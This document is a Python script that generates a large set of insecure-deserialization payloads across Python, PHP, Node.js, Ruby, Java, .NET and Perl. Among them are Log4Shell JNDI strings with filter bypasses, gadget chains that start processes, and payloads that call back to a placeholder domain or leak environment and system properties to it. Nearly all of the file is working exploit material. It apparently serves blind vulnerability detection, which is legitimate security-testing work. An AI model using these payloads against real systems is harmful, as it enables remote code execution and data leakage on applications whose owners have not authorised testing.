#!/usr/bin/env python3
"""
Generate ALL deserialization payloads. Every payload MUST produce at least one
detectable signal: error, math (1337), timing (>4.5s), or OOB ({domain} callback).

No "info-only" or "exec-only" payloads - if the response doesn't change in a
detectable way, it's useless for blind detection.
"""

import base64
import struct
import io

DOMAIN = "{domain}"

def header(name):
    print(f"##{name}##")

def p(payload):
    print(payload)


# ==========================================================================
# Python Pickle - uses eval() for math, os.system for timing/OOB
# P0=ASCII, P2=binary compact, P4=binary most compact
# ==========================================================================

def gen_pickle_p0(desc, code):
    """P0 pickle: cos\nsystem\n(S'cmd'\ntR."""
    import pickle
    # We'll encode manually for os.system
    if code.startswith("os.system"):
        cmd = code.split("'")[1]
        raw = f"cos\nsystem\n(S'{cmd}'\ntR."
    elif code.startswith("eval"):
        expr = code.split("'")[1]
        raw = f"c__builtin__\neval\n(S'{expr}'\ntR."
    elif code.startswith("subprocess"):
        raw = f"csubprocess\ncheck_output\n(S'echo 1337'\nI01\ntR."
    else:
        raw = code
    return base64.b64encode(raw.encode()).decode()

def gen_pickle_p2(module, func, arg_str):
    """P2 pickle via real pickle.dumps"""
    import pickle, types
    class Exploit:
        def __reduce__(self):
            import importlib
            mod = importlib.import_module(module)
            fn = getattr(mod, func)
            return (fn, (arg_str,))
    return base64.b64encode(pickle.dumps(Exploit(), protocol=2)).decode()

def python_pickle():
    # P0 - Math: eval returns 1337 in output
    header("Python Pickle P0 - Math (eval 7*191)")
    p(base64.b64encode(b"c__builtin__\neval\n(S'7*191'\ntR.").decode())

    # P0 - Timing: time.sleep(5) causes >4500ms (pure Python, no OS commands)
    header("Python Pickle P0 - Timing (time.sleep 5)")
    p(base64.b64encode(b"ctime\nsleep\n(I5\ntR.").decode())

    # P0 - OOB: use Python stdlib urllib (no shell commands needed)
    header("Python Pickle P0 - OOB urllib")
    # Uses __builtin__.eval to call urllib since P0 can't import dotted modules directly
    p(base64.b64encode(f"c__builtin__\neval\n(S'__import__(\"urllib.request\").request.urlopen(\"http://{DOMAIN}/pickle\")'\ntR.".encode()).decode())
    # DNS-only via socket (stdlib)
    header("Python Pickle P0 - OOB DNS")
    p(base64.b64encode(f"c__builtin__\neval\n(S'__import__(\"socket\").getaddrinfo(\"{DOMAIN}\",80)'\ntR.".encode()).decode())

    # P0 - Error: eval 1/0 causes ZeroDivisionError in response
    header("Python Pickle P0 - Error (1/0)")
    p(base64.b64encode(b"c__builtin__\neval\n(S'1/0'\ntR.").decode())

    # P0 - Error: import invalid module
    header("Python Pickle P0 - Error (bad import)")
    p(base64.b64encode(b"c__builtin__\n__import__\n(S'invalid_module_1337'\ntR.").decode())

    # P0 - Math: eval('str(7*191)') returns '1337' (pure Python, no subprocess)
    header("Python Pickle P0 - Math (eval str(7*191))")
    p(base64.b64encode(b"c__builtin__\neval\n(S'str(7*191)'\ntR.").decode())

    # P2 - Math
    header("Python Pickle P2 - Math (eval 7*191)")
    p(gen_pickle_p2('builtins', 'eval', '7*191'))

    # P2 - Timing (pure Python, no OS commands)
    header("Python Pickle P2 - Timing (time.sleep 5)")
    p(gen_pickle_p2('time', 'sleep', 5))

    # P2 - OOB via eval+urllib (stdlib)
    header("Python Pickle P2 - OOB urllib")
    p(gen_pickle_p2('builtins', 'eval', f'__import__("urllib.request").request.urlopen("http://{DOMAIN}/pickle2")'))

    # P2 - Error
    header("Python Pickle P2 - Error (1/0)")
    p(gen_pickle_p2('builtins', 'eval', '1/0'))

    # P4 - Math
    import pickle
    class E4:
        def __reduce__(self):
            return (eval, ('7*191',))
    header("Python Pickle P4 - Math (eval 7*191)")
    p(base64.b64encode(pickle.dumps(E4(), protocol=4)).decode())

    # P4 - Timing (pure Python, no OS commands)
    class T4:
        def __reduce__(self):
            import time
            return (time.sleep, (5,))
    header("Python Pickle P4 - Timing (time.sleep 5)")
    p(base64.b64encode(pickle.dumps(T4(), protocol=4)).decode())

    # P4 - OOB via eval+urllib
    class O4:
        def __reduce__(self):
            return (eval, (f'__import__("urllib.request").request.urlopen("http://{DOMAIN}/pickle4")',))
    header("Python Pickle P4 - OOB urllib")
    p(base64.b64encode(pickle.dumps(O4(), protocol=4)).decode())


# ==========================================================================
# Python YAML - !!python/object/apply
# ==========================================================================
def python_yaml():
    header("Python YAML - Math (eval 7*191)")
    p('!!python/object/apply:builtins.eval ["7*191"]')
    header("Python YAML - Math (eval str(7*191))")
    p('!!python/object/apply:builtins.eval ["str(7*191)"]')
    header("Python YAML - Timing (time.sleep 5)")
    p('!!python/object/apply:time.sleep [5]')
    header("Python YAML - OOB urllib")
    p(f'!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen(\'http://{DOMAIN}/yaml\')"]')
    header("Python YAML - OOB DNS")
    p(f'!!python/object/apply:builtins.eval ["__import__(\'socket\').getaddrinfo(\'{DOMAIN}\',80)"]')
    header("Python YAML - Error (bad import)")
    p("!!python/object/apply:builtins.__import__ ['invalid_module_1337']")
    header("Python YAML - Error (1/0)")
    p('!!python/object/apply:builtins.eval ["1/0"]')
    header("Python YAML - OOB exec urllib")
    p(f'!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen(\'http://{DOMAIN}/yaml2\')"]')


# ==========================================================================
# Python jsonpickle
# ==========================================================================
def python_jsonpickle():
    header("Python jsonpickle - Math (eval 7*191)")
    p('{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}')
    header("Python jsonpickle - Math (eval str(7*191))")
    p('{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["str(7*191)"]}]}')
    header("Python jsonpickle - Timing (sleep 5)")
    p('{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}')
    header("Python jsonpickle - Error (1/0)")
    p('{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}')
    header("Python jsonpickle - OOB urllib")
    p(f'{{"py/reduce":[{{"py/function":"builtins.eval"}},{{"py/tuple":["__import__(\'urllib.request\').request.urlopen(\'http://{DOMAIN}/jsonpickle\')"]}}]}}')
    header("Python jsonpickle - OOB DNS")
    p(f'{{"py/reduce":[{{"py/function":"builtins.eval"}},{{"py/tuple":["__import__(\'socket\').getaddrinfo(\'{DOMAIN}\',80)"]}}]}}')


# ==========================================================================
# PHP Unserialize
# ==========================================================================
def php_unserialize():
    # Error probes - malformed data triggers parse errors
    header("PHP Unserialize - Error (nonexistent class)")
    p('O:9999:"NonExist":0:{}')
    header("PHP Unserialize - Error (malformed)")
    p('O:1:"X":0:{')
    header("PHP Unserialize - Error (bad length)")
    p('O:8:"stdClass":99:{s:1:"x";s:1:"y";}')
    header("PHP Unserialize - Error (truncated)")
    p('O:8:"stdCl')

    # Type juggling - these change auth behavior (detectable by auth bypass, not 4-pillar)
    # Kept because they produce different response than normal input → response diff detection
    header("PHP Unserialize - Error (nested invalid)")
    p('a:1:{i:0;O:23:"UndefinedClassName1337":0:{}}')

    # Framework-specific gadget chains (produce errors when classes don't exist)
    header("PHP Unserialize - Laravel PendingBroadcast")
    p('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\0*\\0events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\\0*\\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\\0*\\0event";s:21:"nslookup {domain}";}')
    header("PHP Unserialize - Symfony CacheAdapter")
    p('O:44:"Symfony\\Component\\Cache\\Adapter\\ProxyAdapter":2:{s:54:"\\0Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\\0pool";O:44:"Symfony\\Component\\Cache\\Adapter\\ArrayAdapter":3:{s:54:"\\0Symfony\\Component\\Cache\\Adapter\\ArrayAdapter\\0values";a:0:{}s:60:"\\0Symfony\\Component\\Cache\\Adapter\\ArrayAdapter\\0expiration";a:0:{}s:21:"\\0*\\0createCacheItem";a:2:{i:0;O:15:"Faker\\Generator":1:{s:13:"\\0*\\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\\0Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\\0setInner";s:9:"echo 1337";}')


# ==========================================================================
# Node.js
# ==========================================================================
def node_js():
    # node-serialize - _$$ND_FUNC$$_ with IIFE
    header("Node node-serialize - Math (return 7*191)")
    p('{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}')
    header("Node node-serialize - Timing (blocking 5s)")
    p('{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}')
    header("Node node-serialize - OOB http.get")
    p(f'{{"rce":"_$$ND_FUNC$$_function(){{require(\'http\').get(\'http://{DOMAIN}/nodeser\')}}()"}}')
    header("Node node-serialize - Math (eval 7*191)")
    p('{"rce":"_$$ND_FUNC$$_function(){return eval(\'7*191\')}()"}')
    header("Node node-serialize - Error (throw)")
    p('{"rce":"_$$ND_FUNC$$_function(){throw new Error(\'1337\')}()"}')

    # js-yaml - use tags that produce detectable errors
    header("Node js-yaml - Error (unknown tag)")
    p('!!invalid_tag_probe 1337')
    header("Node js-yaml - Error (bad regexp)")
    p('!!js/regexp /[invalid/')

    # funcster - needs funcster.deepDeserialize() + function invocation
    header("Node funcster - Math (7*191)")
    p('{"fn":{"__js_function":"function(){return 7*191}"}}')

    # cryo - prototype pollution + _$$ND_FUNC$$_ IIFE auto-invokes via node-serialize
    header("Node cryo - Error (proto pollution)")
    p(f'{{"__proto__":{{"__cryo__":{{"reduce":"_$$ND_FUNC$$_function(){{throw new Error(1337)}}()"}}}}}}')


# ==========================================================================
# Ruby YAML + Marshal
# ==========================================================================
def ruby():
    # YAML - Error-triggering: invoke method on deserialized object
    header("Ruby YAML - Error (invalid class)")
    p("--- !ruby/object:NonExistentClass1337\\ni: x")
    header("Ruby YAML - Error (Gem::Requirement chain)")
    p("--- !ruby/object:Gem::Requirement\\nrequirements:\\n  !ruby/object:Gem::Package::TarReader\\n  io: &1 !ruby/object:Net::BufferedIO\\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n       read: 0\\n       header: \"abc\"\\n    debug_output: &1 !ruby/object:Net::WriteAdapter\\n       socket: &1 !ruby/object:Gem::RequestSet\\n           sets: !ruby/object:Net::WriteAdapter\\n               socket: !ruby/module 'Kernel'\\n               method_id: :system\\n           git_set: nslookup {domain}\\n       method_id: :resolve")
    header("Ruby YAML - Error (ERB template)")
    p("--- !ruby/object:Gem::Requirement\\nrequirements: !ruby/object:Gem::DependencyList\\n  specs:\\n  - !ruby/object:Gem::Source\\n    current_fetch_uri: !ruby/object:URI::Generic\\n      path: \"| nslookup {domain}\"")

    # Marshal - base64 encoded
    # Malformed probes that trigger TypeError/ArgumentError on deserialization
    header("Ruby Marshal - Error (invalid class)")
    p("BAhvOh5Ob25FeGlzdGVudENsYXNzMTMzNwY6BmlJIgZ4BjoGRVQ=")
    header("Ruby Marshal - Error (ERB template)")
    p("BAhvOghFUkIHOglAc3JjSSIfPCU9IGBuc2xvb2t1cCB7ZG9tYWlufWAgJT4GOgZFVDoOQGZpbGVuYW1lSSILKGVyYikGOgZFVA==")
    header("Ruby Marshal - Error (malformed)")
    p("BAj/AAAA")
    header("Ruby Marshal - Error (truncated)")
    p("BAhvOjBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=")



# ==========================================================================
# Java JNDI (Log4Shell) - all OOB
# ==========================================================================
def java_jndi():
    for proto in ['ldap', 'rmi', 'iiop']:
        header(f"Java JNDI - OOB {proto}")
        p(f'${{jndi:{proto}://{DOMAIN}/a}}')

    bypasses = [
        ("Log4Shell bypass 1", f"${{${{lower:j}}ndi:${{lower:l}}dap://{DOMAIN}/a}}"),
        ("Log4Shell bypass 2", f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{DOMAIN}/a}}"),
        ("Log4Shell bypass 3", f"${{j${{::-n}}di:ldap://{DOMAIN}/a}}"),
        ("Log4Shell bypass 4", f"${{jn${{lower:d}}i:ldap://{DOMAIN}/a}}"),
        ("Log4Shell bypass 5", f"${{j${{${{:-l}}${{:-o}}${{:-w}}${{:-e}}${{:-r}}:n}}di:ldap://{DOMAIN}/a}}"),
    ]
    for name, payload in bypasses:
        header(f"Java JNDI - OOB {name}")
        p(payload)

    # Info leak variants
    header("Java JNDI - OOB env leak")
    p(f"${{jndi:ldap://{DOMAIN}/${{env:USER}}}}")
    header("Java JNDI - OOB java version leak")
    p(f"${{jndi:ldap://{DOMAIN}/${{java:version}}}}")
    header("Java JNDI - OOB sys property leak")
    p(f"${{jndi:ldap://{DOMAIN}/${{sys:user.dir}}}}")


# ==========================================================================
# Java Jackson - all produce errors (class resolution/JNDI failures)
# ==========================================================================
def java_jackson():
    header("Java Jackson - Error (JdbcRowSetImpl LDAP)")
    p(f'["com.sun.rowset.JdbcRowSetImpl",{{"dataSourceName":"ldap://{DOMAIN}/a","autoCommit":true}}]')
    header("Java Jackson - Error (JdbcRowSetImpl RMI)")
    p(f'["com.sun.rowset.JdbcRowSetImpl",{{"dataSourceName":"rmi://{DOMAIN}/a","autoCommit":true}}]')
    header("Java Jackson - Error (ClassPathXml)")
    p(f'["org.springframework.context.support.ClassPathXmlApplicationContext","http://{DOMAIN}/evil.xml"]')
    header("Java Jackson - Error (TemplatesImpl)")
    p('["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}]')
    header("Java Jackson - Error (InetAddress DNS)")
    p(f'["java.net.InetSocketAddress",{{"address":"","port":80,"hostName":"{DOMAIN}"}}]')
    header("Java Jackson - Error (C3P0)")
    p(f'["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{{"jndiName":"ldap://{DOMAIN}/a","loginTimeout":0}}]')
    header("Java Jackson - Error (@type JdbcRowSetImpl)")
    p(f'{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{DOMAIN}/a","autoCommit":true}}')
    header("Java Jackson - Error (TemplatesImpl @class)")
    p('{"@class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}')
    header("Java Jackson - Error (XBean JndiConverter)")
    p(f'["org.apache.xbean.propertyeditor.JndiConverter",{{"asText":"ldap://{DOMAIN}/a"}}]')
    header("Java Jackson - Error (Logback)")
    p(f'["ch.qos.logback.core.db.JNDIConnectionSource",{{"jndiLocation":"ldap://{DOMAIN}/a"}}]')
    header("Java Jackson - Error (Spring)")
    p(f'["org.springframework.context.support.ClassPathXmlApplicationContext","http://{DOMAIN}/jackson.xml"]')


# ==========================================================================
# Java Fastjson - errors/OOB via @type
# ==========================================================================
def java_fastjson():
    header("Java Fastjson - Error (JdbcRowSetImpl)")
    p(f'{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{DOMAIN}/a","autoCommit":true}}')
    header("Java Fastjson - Error (TemplatesImpl)")
    p('{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vg=="],"_name":"a","_tfactory":{},"_outputProperties":{}}')
    header("Java Fastjson - OOB (InetAddress DNS)")
    p(f'{{"@type":"java.net.InetAddress","val":"{DOMAIN}"}}')
    header("Java Fastjson - OOB (Inet4Address)")
    p(f'{{"@type":"java.net.Inet4Address","val":"{DOMAIN}"}}')
    # Bypass variants
    header("Java Fastjson - Error (L prefix bypass)")
    p(f'{{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://{DOMAIN}/a","autoCommit":true}}')
    header("Java Fastjson - Error (LL bypass)")
    p(f'{{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{DOMAIN}/a","autoCommit":true}}')
    header("Java Fastjson - Error (1.2.47 cache bypass)")
    p(f'{{"a":{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}},"b":{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{DOMAIN}/a","autoCommit":true}}}}')


# ==========================================================================
# Java XStream - errors from gadget chain processing
# ==========================================================================
def java_xstream():
    header("Java XStream - Error (ProcessBuilder)")
    p(f'<java.lang.ProcessBuilder><command><string>nslookup</string><string>{DOMAIN}</string></command></java.lang.ProcessBuilder>')
    header("Java XStream - Error (EventHandler)")
    p(f'<sorted-set><string>foo</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>nslookup</string><string>{DOMAIN}</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>')
    header("Java XStream - Error (Runtime exec)")
    p(f'<object class="java.lang.Runtime" method="getRuntime"><void method="exec"><string>nslookup {DOMAIN}</string></void></object>')
    header("Java XStream - Error (ImageIO/NativeString)")
    p(f'<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/plain</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.ArrayList$Itr"><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount></iter><next class="java.lang.ProcessBuilder"><command><string>nslookup</string><string>{DOMAIN}</string></command></next></iterator></e></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry></map>')
    header("Java XStream - Error (Spring JNDI)")
    p(f'<org.springframework.beans.factory.config.PropertyPathFactoryBean><targetBeanName>ldap://{DOMAIN}/a</targetBeanName><propertyPath>a</propertyPath><beanFactory class="org.springframework.jndi.support.SimpleJndiBeanFactory"><shareableResources><string>ldap://{DOMAIN}/a</string></shareableResources></beanFactory></org.springframework.beans.factory.config.PropertyPathFactoryBean>')


# ==========================================================================
# Java SnakeYAML - errors from class instantiation
# ==========================================================================
def java_snakeyaml():
    header("SnakeYAML - Error (URLClassLoader OOB)")
    p(f'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{DOMAIN}/snakeyaml"]]]]')
    header("SnakeYAML - Error (JdbcRowSetImpl JNDI)")
    p(f'!!com.sun.rowset.JdbcRowSetImpl {{dataSourceName: "ldap://{DOMAIN}/a", autoCommit: true}}')
    header("SnakeYAML - Error (nonexistent class)")
    p('!!com.nonexistent.FakeClass1337 {}')
    header("SnakeYAML - Error (C3P0)")
    p(f'!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {{userOverridesAsString: "HexAsciiSerializedMap:aced...;", jndiName: "ldap://{DOMAIN}/a"}}')


# ==========================================================================
# Java XMLDecoder - math/timing/OOB/error via ProcessBuilder
# ==========================================================================
def java_xmldecoder():
    header("XMLDecoder - Math (expr 7*191)")
    p(f'<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \\* 191</string></void></array><void method="start"/></object></java>')
    header("XMLDecoder - Timing (sleep 5)")
    p('<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>')
    header("XMLDecoder - OOB URL.openStream")
    p(f'<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{DOMAIN}/xmldecoder</string><void method="openStream"/></object></java>')
    header("XMLDecoder - Error (invalid class)")
    p('<java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>')


# ==========================================================================
# Java Serialized Objects - error probes
# ==========================================================================
def java_serialized():
    header("Java Serialized - Error (HashSet header)")
    p("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==")
    header("Java Serialized - Error (String array)")
    p("rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0AAxuc2xvb2t1cCB0ZXN0dAAEdGVzdA==")
    header("ysoserial URLDNS - OOB (DNS lookup)")
    p("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==")
    header("Java Hessian - OOB (JNDI ref)")
    p(f"C_hessianRldap://{DOMAIN}/a")


# ==========================================================================
# .NET - all produce errors or OOB
# ==========================================================================
def dotnet():
    # Json.NET TypeNameHandling
    header(".NET Json.NET - OOB (nslookup)")
    p(f'{{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{{"$type":"System.Diagnostics.Process, System","StartInfo":{{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{DOMAIN}"}}}}}}')
    header(".NET Json.NET - Math (set /a 7*191)")
    p('{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}')
    header(".NET Json.NET - Timing (timeout 5)")
    p('{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}')
    header(".NET Json.NET - OOB (AssemblyInstaller UNC)")
    p(f'{{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"\\\\\\\\{DOMAIN}\\\\share\\\\evil.dll"}}')
    # XmlSerializer
    header(".NET XmlSerializer - OOB (nslookup)")
    p(f'<root type="System.Windows.Data.ObjectDataProvider, PresentationFramework"><ObjectInstance type="System.Diagnostics.Process, System"><StartInfo><FileName>nslookup</FileName><Arguments>{DOMAIN}</Arguments></StartInfo></ObjectInstance><MethodName>Start</MethodName></root>')

    # BinaryFormatter - error probes (truncated/malformed)
    header(".NET BinaryFormatter - Error (header probe)")
    p("AAEAAAD/////AQAAAAAAAAAEAQAAAA==")
    header(".NET BinaryFormatter - Error (TypeConfuseDelegate)")
    p("AAEAAAD/////AQAAAAAAAAAEAQAAAD1TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZw==")

    # SoapFormatter
    header(".NET SoapFormatter - OOB (nslookup)")
    p(f'<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><a1:ObjectDataProvider xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework"><MethodName>Start</MethodName><ObjectInstance xsi:type="a2:Process" xmlns:a2="http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System"><StartInfo><FileName>nslookup</FileName><Arguments>{DOMAIN}</Arguments></StartInfo></ObjectInstance></a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>')

    # ViewState
    header(".NET ViewState - Error (probe)")
    p("__VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==")
    header(".NET ViewState - Error (generator)")
    p("__VIEWSTATEGENERATOR=CA0B0334")

    # JavaScriptSerializer
    header(".NET JavaScriptSerializer - Error (ObjectDataProvider)")
    p('{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}')

    # LosFormatter
    header(".NET LosFormatter - Error (truncated)")
    p("/wEAAQAAAP////8BAAAAAAAAAA==")

    # ObjectStateFormatter
    header(".NET ObjectStateFormatter - Error (probe)")
    p("AAEAAAD/////AQAAAAAAAAAMAQAAABVTeXN0ZW0uV2luZG93cy5Gb3Jtcw==")


# ==========================================================================
# Perl - error probes + OOB
# ==========================================================================
def perl():
    header("Perl Storable - Error (malformed nfreeze)")
    p("cHN0MAUKBAAAAAAAAAAA")
    header("Perl Storable - Error (bad version)")
    p("cHN0MP///wQA")
    header("Perl Storable - Error (large length DoS)")
    p("cHN0MAUKBAP/////")
    header("Perl YAML - Error (invalid syntax)")
    p("--- {{{invalid yaml 1337")
    header("Perl YAML - Error (!!perl/regexp eval)")
    p('--- !!perl/regexp (?{system("echo 1337")})')
    header("Perl YAML - Error (!!perl/regexp nested eval)")
    p('--- !!perl/regexp (?{eval("die 1337")})')


# ==========================================================================
# MAIN
# ==========================================================================
if __name__ == '__main__':
    python_pickle()
    python_yaml()
    python_jsonpickle()
    php_unserialize()
    node_js()
    ruby()
    java_jndi()
    java_jackson()
    java_fastjson()
    java_xstream()
    java_snakeyaml()
    java_xmldecoder()
    java_serialized()
    dotnet()
    perl()
